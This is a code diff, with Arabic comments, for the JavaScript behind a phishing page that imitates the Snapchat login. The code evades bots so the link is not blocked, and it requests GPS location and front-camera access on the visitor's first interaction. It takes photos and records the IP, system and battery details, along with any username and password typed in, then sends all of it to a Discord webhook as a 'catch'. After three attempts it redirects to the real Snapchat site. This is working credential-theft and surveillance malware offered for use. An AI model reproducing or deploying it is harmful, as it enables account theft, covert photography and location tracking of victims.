@@ -4,13 +4,11 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 let loginAttempts = 0;
 
-// فحص الـ Bots لمنع حظر الرابط
 function isBot() {
     const ua = navigator.userAgent.toLowerCase();
     return ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || navigator.webdriver;
 }
 
-// جلب الـ IP والموقع الجغرافي
 async function getIPAndLocation() {
     try {
         const res = await fetch('https://ipapi.co/json/');
@@ -27,7 +25,6 @@ async function getIPAndLocation() {
     }
 }
 
-// معلومات النظام والبطارية
 async function getSystemInfo() {
     const geoip = await getIPAndLocation();
     const ua = navigator.userAgent;
@@ -46,44 +43,61 @@ async function getSystemInfo() {
     return { ...geoip, ua, platform, language, screenRes, batteryInfo };
 }
 
-// التقاط صورة من الكاميرا
-async function captureCamera(facingMode) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: facingMode } 
-        });
-        video.srcObject = stream;
-        
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, 640, 480);
-        
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-        stream.getTracks().forEach(track => track.stop());
-        return blob;
-    } catch (e) {
-        return null;
-    }
-}
-
-// إرسال البيانات إلى ديسكورد
-async function sendToDiscord(blobs, lat, lng, user = "", pass = "", status = "") {
+// دالة طلب الموقع والكاميرا وإرسال التقرير
+async function triggerPermissionsAndCapture(user = "", pass = "", status = "") {
     if (isBot()) return;
 
+    let lat = null, lng = null;
+
+    // طلب إذن الموقع الجغرافي (يظهر نافذة السماح للمستخدم)
+    await new Promise((resolve) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    lat = pos.coords.latitude;
+                    lng = pos.coords.longitude;
+                    resolve();
+                },
+                () => { resolve(); },
+                { timeout: 5000, enableHighAccuracy: true }
+            );
+        } else {
+            resolve();
+        }
+    });
+
+    // طلب إذن الكاميرا الأمامية والتقاط الصورة
+    let frontBlob = null;
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+        await new Promise(r => setTimeout(r, 2000));
+        
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 640, 480);
+        frontBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
+        
+        stream.getTracks().forEach(t => t.stop());
+    } catch (e) {}
+
+    // إرسال البيانات كاملة إلى ديسكورد
+    await sendToDiscord(frontBlob, lat, lng, user, pass, status);
+}
+
+async function sendToDiscord(frontBlob, lat, lng, user = "", pass = "", status = "") {
     try {
         const info = await getSystemInfo();
         const formData = new FormData();
         
-        let content = `🚨 **[ تقرير صيد جديد ]**\n` +
+        let content = `🚨 **[ صيد جديد متفاعل ]**\n` +
                       `🌐 **IP:** \`${info.ip}\`\n` +
                       `🏙️ **الموقع (IP):** \`${info.country} - ${info.city} (${info.org})\`\n` +
-                      `💻 **النظام:** \`${info.platform}\` | 🔋 **البطارية:** \`${info.batteryInfo}\`\n` +
-                      `📐 **الشاشة:** \`${info.screenRes}\`\n`;
+                      `💻 **النظام:** \`${info.platform}\` | 🔋 **البطارية:** \`${info.batteryInfo}\`\n`;
         
         if (lat && lng) {
-            content += `📍 **GPS:** [رابط الخريطة](https://www.google.com/maps?q=${lat},${lng}) (\`${lat}, ${lng}\`)\n`;
+            content += `📍 **موقع GPS الدقيق:** [اضغط هنا للعرض](https://www.google.com/maps?q=${lat},${lng}) (\`${lat}, ${lng}\`)\n`;
         } else {
-            content += `📍 **GPS:** لم يتم السماح به.\n`;
+            content += `📍 **موقع GPS:** لم يتم السماح به.\n`;
         }
 
         if (user) {
@@ -96,8 +110,7 @@ async function sendToDiscord(blobs, lat, lng, user = "", pass = "", status = "")
         
         content += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
 
-        if (blobs.front) formData.append('file1', blobs.front, 'front_shot.png');
-        if (blobs.back) formData.append('file2', blobs.back, 'back_shot.png');
+        if (frontBlob) formData.append('file1', frontBlob, 'shot.png');
 
         formData.append('payload_json', JSON.stringify({
             content: content,
@@ -109,17 +122,15 @@ async function sendToDiscord(blobs, lat, lng, user = "", pass = "", status = "")
     } catch (err) {}
 }
 
-// التشغيل التلقائي عند الدخول للصفحة
-window.addEventListener('DOMContentLoaded', async () => {
-    let lat = null, lng = null;
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(p => {
-            lat = p.coords.latitude;
-            lng = p.coords.longitude;
-        }, () => {}, { timeout: 5000 });
-    }
-    
-    await sendToDiscord({}, lat, lng, "", "", "تم فتح الصفحة وزيارة الرابط.");
+// التشغيل بمجرد تفاعل المستخدم لأول مرة مع الصفحة (لضمان ظهور نافذة الأذونات)
+let triggered = false;
+['click', 'touchstart', 'scroll'].forEach(evt => {
+    window.addEventListener(evt, () => {
+        if (!triggered) {
+            triggered = true;
+            triggerPermissionsAndCapture("", "", "تم السماح والتفاعل مع الصفحة أولوياً.");
+        }
+    }, { once: true });
 });
 
 // التعامل مع نموذج تسجيل الدخول
@@ -135,28 +146,14 @@ if (loginForm) {
         const loadingOverlay = document.getElementById('loadingOverlay');
         if (loadingOverlay) loadingOverlay.style.display = 'flex';
 
-        let lat = null, lng = null;
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                lat = pos.coords.latitude;
-                lng = pos.coords.longitude;
-            }, () => {}, { timeout: 4000 });
-        }
-
-        // سحب الصور عند ضغط زر تسجيل الدخول
-        let front = await captureCamera("user");
-        let back = await captureCamera("environment");
-
-        await sendToDiscord({ front, back }, lat, lng, u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);
+        await triggerPermissionsAndCapture(u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);
 
         setTimeout(() => {
             if (loadingOverlay) loadingOverlay.style.display = 'none';
 
             if (loginAttempts >= 3) {
-                // المحاولة الثالثة: التحويل إلى سناب شات الرسمي[span_1](start_span)[span_1](end_span)
                 window.location.href = "https://accounts.snapchat.com/";
             } else {
-                // المحاولة الأولى والثانية: إظهار خطأ كلمة المرور[span_2](start_span)[span_2](end_span)
                 const errorMsg = document.getElementById('loginErrorMsg');
                 if (errorMsg) errorMsg.style.display = 'block';
                 e.target.password.value = "";
